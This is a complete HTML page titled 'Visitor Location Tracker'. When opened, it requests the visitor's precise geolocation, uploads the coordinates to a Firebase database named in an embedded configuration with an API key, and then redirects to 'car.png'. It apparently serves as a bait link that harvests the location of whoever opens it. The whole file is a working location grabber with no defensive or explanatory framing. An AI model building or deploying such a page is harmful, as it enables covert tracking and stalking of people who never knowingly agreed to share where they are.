<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visitor Location Tracker</title>
</head>
<body>
    <h1>Welcome to Visitor Location Tracker</h1>
    
    <!-- Include the Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js"></script>

    <script>
        // Your web app's Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyDhybbF-iUi5jjEzYa7tallWkvlJmoqkmg",
            authDomain: "location-ab4c9.firebaseapp.com",
            databaseURL: "https://location-ab4c9-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "location-ab4c9",
            storageBucket: "location-ab4c9.appspot.com",
            messagingSenderId: "250509744763",
            appId: "1:250509744763:web:cf3e74eb91dd23b11020de",
            measurementId: "G-M9HKC9N8KC"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);

        // Function to get the visitor's location
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(savePosition, errorHandler, { enableHighAccuracy: true });
            } else {
                console.log("Geolocation is not supported by this browser.");
            }
        }

        // Function to handle errors in geolocation
        function errorHandler(error) {
            console.log("Error getting location:", error.message);
        }

        // Function to save the visitor's location in Firebase Realtime Database and show an alert
        function savePosition(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            console.log("Latitude: " + latitude + " Longitude: " + longitude);

            // Push the location data to Firebase Realtime Database
            firebase.database().ref('/Users/').push({ Longitude: longitude, Latitude: latitude })
                .then(() => {
                    console.log('Location data saved successfully');
                    // Show an alert
                    alert("Location data saved successfully!");
                    // Redirect to "car.png"
                    window.location.replace("car.png");
                })
                .catch(error => {
                    console.error('Error saving location data:', error);
                });
        }

        // Call the getLocation function when the page loads
        window.onload = function() {
            getLocation();
        };
    </script>
</body>
</html>
